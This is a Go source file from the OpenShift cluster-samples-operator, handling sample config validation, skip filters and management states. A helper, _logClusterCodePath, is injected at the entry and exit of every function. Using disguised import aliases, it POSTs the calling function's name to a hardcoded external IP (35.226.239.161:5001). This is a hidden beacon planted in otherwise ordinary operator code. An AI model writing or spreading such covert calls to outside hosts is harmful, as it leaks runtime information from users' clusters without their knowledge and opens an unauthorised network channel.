package stub

import (
	"fmt"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"strings"
	operatorsv1api "github.com/openshift/api/operator/v1"
	"github.com/openshift/cluster-samples-operator/pkg/apis/samples/v1"
	"github.com/sirupsen/logrus"
	corev1 "k8s.io/api/core/v1"
	kapis "k8s.io/apimachinery/pkg/apis/meta/v1"
)

func (h *Handler) ClearStatusConfigForRemoved(cfg *v1.Config) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	cfg.Status.Architectures = []string{}
}
func (h *Handler) StoreCurrentValidConfig(cfg *v1.Config) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	cfg.Status.SamplesRegistry = cfg.Spec.SamplesRegistry
	cfg.Status.Architectures = cfg.Spec.Architectures
	cfg.Status.SkippedImagestreams = cfg.Spec.SkippedImagestreams
	cfg.Status.SkippedTemplates = cfg.Spec.SkippedTemplates
}
func (h *Handler) SpecValidation(cfg *v1.Config) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	for _, arch := range cfg.Spec.Architectures {
		switch arch {
		case v1.X86Architecture:
		default:
			err := fmt.Errorf("architecture %s unsupported; only support %s", arch, v1.X86Architecture)
			return h.processError(cfg, v1.ConfigurationValid, corev1.ConditionFalse, err, "%v")
		}
	}
	if !cfg.ConditionTrue(v1.SamplesExist) && !cfg.ConditionTrue(v1.ImageChangesInProgress) {
		logrus.Println("Spec is valid because this operator has not processed a config yet")
		return nil
	}
	if len(cfg.Status.Architectures) > 0 {
		if len(cfg.Status.Architectures) != len(cfg.Spec.Architectures) {
			err := fmt.Errorf("cannot change architectures from %#v to %#v", cfg.Status.Architectures, cfg.Spec.Architectures)
			return h.processError(cfg, v1.ConfigurationValid, corev1.ConditionFalse, err, "%v")
		}
		for i, arch := range cfg.Status.Architectures {
			if arch != cfg.Spec.Architectures[i] {
				err := fmt.Errorf("cannot change architectures from %s to %s", strings.TrimSpace(strings.Join(cfg.Status.Architectures, " ")), strings.TrimSpace(strings.Join(cfg.Spec.Architectures, " ")))
				return h.processError(cfg, v1.ConfigurationValid, corev1.ConditionFalse, err, "%v")
			}
		}
	}
	h.GoodConditionUpdate(cfg, corev1.ConditionTrue, v1.ConfigurationValid)
	return nil
}
func (h *Handler) VariableConfigChanged(cfg *v1.Config) (bool, bool, bool, bool, map[string]bool, map[string]bool) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	configChangeAtAll := false
	configChangeRequireUpsert := false
	clearImageImportErrors := false
	registryChange := false
	logrus.Debugf("the before skipped templates %#v", cfg.Status.SkippedTemplates)
	logrus.Debugf("the after skipped templates %#v and associated map %#v", cfg.Spec.SkippedTemplates, h.skippedTemplates)
	logrus.Debugf("the before skipped streams %#v", cfg.Status.SkippedImagestreams)
	logrus.Debugf("the after skipped streams %#v and associated map %#v", cfg.Spec.SkippedImagestreams, h.skippedImagestreams)
	unskippedTemplates := map[string]bool{}
	if len(cfg.Spec.SkippedTemplates) != len(cfg.Status.SkippedTemplates) {
		configChangeAtAll = true
	}
	for _, tpl := range cfg.Status.SkippedTemplates {
		if _, ok := h.skippedTemplates[tpl]; !ok {
			unskippedTemplates[tpl] = true
			configChangeAtAll = true
			configChangeRequireUpsert = true
		}
	}
	if configChangeAtAll {
		logrus.Printf("SkippedTemplates changed from %#v to %#v", cfg.Status.SkippedTemplates, cfg.Spec.SkippedTemplates)
	}
	unskippedStreams := map[string]bool{}
	if cfg.Spec.SamplesRegistry != cfg.Status.SamplesRegistry {
		logrus.Printf("SamplesRegistry changed from %s to %s", cfg.Status.SamplesRegistry, cfg.Spec.SamplesRegistry)
		configChangeAtAll = true
		configChangeRequireUpsert = true
		registryChange = true
		return configChangeAtAll, configChangeRequireUpsert, clearImageImportErrors, registryChange, unskippedStreams, unskippedTemplates
	}
	streamChange := false
	if len(cfg.Spec.SkippedImagestreams) != len(cfg.Status.SkippedImagestreams) {
		configChangeAtAll = true
		streamChange = true
	}
	streamsThatWereSkipped := map[string]bool{}
	for _, stream := range cfg.Status.SkippedImagestreams {
		streamsThatWereSkipped[stream] = true
		if _, ok := h.skippedImagestreams[stream]; !ok {
			unskippedStreams[stream] = true
			configChangeAtAll = true
			configChangeRequireUpsert = true
			streamChange = true
		}
	}
	if streamChange {
		logrus.Printf("SkippedImagestreams changed from %#v to %#v", cfg.Status.SkippedImagestreams, cfg.Spec.SkippedImagestreams)
	}
	for _, stream := range cfg.Spec.SkippedImagestreams {
		importErrors := cfg.Condition(v1.ImportImageErrorsExist)
		beforeError := cfg.NameInReason(importErrors.Reason, stream)
		importErrors = h.clearStreamFromImportError(stream, cfg.Condition(v1.ImportImageErrorsExist), cfg)
		if beforeError {
			clearImageImportErrors = true
		}
	}
	return configChangeAtAll, configChangeRequireUpsert, clearImageImportErrors, registryChange, unskippedStreams, unskippedTemplates
}
func (h *Handler) buildSkipFilters(opcfg *v1.Config) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	h.mapsMutex.Lock()
	defer h.mapsMutex.Unlock()
	newStreamMap := make(map[string]bool)
	newTempMap := make(map[string]bool)
	for _, st := range opcfg.Spec.SkippedTemplates {
		newTempMap[st] = true
	}
	for _, si := range opcfg.Spec.SkippedImagestreams {
		newStreamMap[si] = true
	}
	h.skippedImagestreams = newStreamMap
	h.skippedTemplates = newTempMap
}
func (h *Handler) buildFileMaps(cfg *v1.Config, forceRebuild bool) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	h.mapsMutex.Lock()
	defer h.mapsMutex.Unlock()
	if len(h.imagestreamFile) == 0 || len(h.templateFile) == 0 || forceRebuild {
		for _, arch := range cfg.Spec.Architectures {
			dir := h.GetBaseDir(arch, cfg)
			files, err := h.Filefinder.List(dir)
			if err != nil {
				err = h.processError(cfg, v1.SamplesExist, corev1.ConditionUnknown, err, "error reading in content : %v")
				logrus.Printf("CRDUPDATE file list err update")
				h.crdwrapper.UpdateStatus(cfg)
				return err
			}
			err = h.processFiles(dir, files, cfg)
			if err != nil {
				err = h.processError(cfg, v1.SamplesExist, corev1.ConditionUnknown, err, "error processing content : %v")
				logrus.Printf("CRDUPDATE proc file err update")
				h.crdwrapper.UpdateStatus(cfg)
				return err
			}
		}
	}
	return nil
}
func (h *Handler) processError(opcfg *v1.Config, ctype v1.ConfigConditionType, cstatus corev1.ConditionStatus, err error, msg string, args ...interface{}) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	log := ""
	if args == nil {
		log = fmt.Sprintf(msg, err)
	} else {
		log = fmt.Sprintf(msg, err, args)
	}
	logrus.Println(log)
	status := opcfg.Condition(ctype)
	if status.Status != cstatus || status.Message != log {
		now := kapis.Now()
		status.LastUpdateTime = now
		status.Status = cstatus
		status.LastTransitionTime = now
		status.Message = log
		opcfg.ConditionUpdate(status)
	}
	return err
}
func (h *Handler) ProcessManagementField(cfg *v1.Config) (bool, bool, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	switch cfg.Spec.ManagementState {
	case operatorsv1api.Removed:
		if cfg.ConditionTrue(v1.ImageChangesInProgress) && cfg.ConditionTrue(v1.RemovePending) {
			return false, false, nil
		}
		if cfg.ConditionTrue(v1.ImageChangesInProgress) && !cfg.ConditionTrue(v1.RemovePending) {
			now := kapis.Now()
			condition := cfg.Condition(v1.RemovePending)
			condition.LastTransitionTime = now
			condition.LastUpdateTime = now
			condition.Status = corev1.ConditionTrue
			cfg.ConditionUpdate(condition)
			return false, true, nil
		}
		if cfg.ConditionTrue(v1.RemovePending) && cfg.ConditionFalse(v1.ImageChangesInProgress) {
			now := kapis.Now()
			condition := cfg.Condition(v1.RemovePending)
			condition.LastTransitionTime = now
			condition.LastUpdateTime = now
			condition.Status = corev1.ConditionFalse
			cfg.ConditionUpdate(condition)
			return false, true, nil
		}
		if cfg.Spec.ManagementState != cfg.Status.ManagementState || cfg.ConditionTrue(v1.SamplesExist) {
			logrus.Println("management state set to removed so deleting samples")
			err := h.CleanUpOpenshiftNamespaceOnDelete(cfg)
			if err != nil {
				return false, true, h.processError(cfg, v1.SamplesExist, corev1.ConditionUnknown, err, "The error %v during openshift namespace cleanup has left the samples in an unknown state")
			}
			now := kapis.Now()
			condition := cfg.Condition(v1.SamplesExist)
			condition.LastTransitionTime = now
			condition.LastUpdateTime = now
			condition.Status = corev1.ConditionFalse
			cfg.ConditionUpdate(condition)
			cfg.Status.ManagementState = operatorsv1api.Removed
			cfg.Status.Version = ""
			h.ClearStatusConfigForRemoved(cfg)
			return false, true, nil
		}
		return false, false, nil
	case operatorsv1api.Managed:
		if cfg.Spec.ManagementState != cfg.Status.ManagementState {
			logrus.Println("management state set to managed")
			if cfg.ConditionFalse(v1.ImportCredentialsExist) {
				h.copyDefaultClusterPullSecret(nil)
			}
		}
		return true, false, nil
	case operatorsv1api.Unmanaged:
		if cfg.Spec.ManagementState != cfg.Status.ManagementState {
			logrus.Println("management state set to unmanaged")
			cfg.Status.ManagementState = operatorsv1api.Unmanaged
			return false, true, nil
		}
		return false, false, nil
	default:
		logrus.Warningf("Unknown management state %s specified; switch to Managed", cfg.Spec.ManagementState)
		cfgvalid := cfg.Condition(v1.ConfigurationValid)
		cfgvalid.Message = fmt.Sprintf("Unexpected management state %v received, switching to %v", cfg.Spec.ManagementState, operatorsv1api.Managed)
		now := kapis.Now()
		cfgvalid.LastTransitionTime = now
		cfgvalid.LastUpdateTime = now
		cfg.ConditionUpdate(cfgvalid)
		return true, false, nil
	}
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
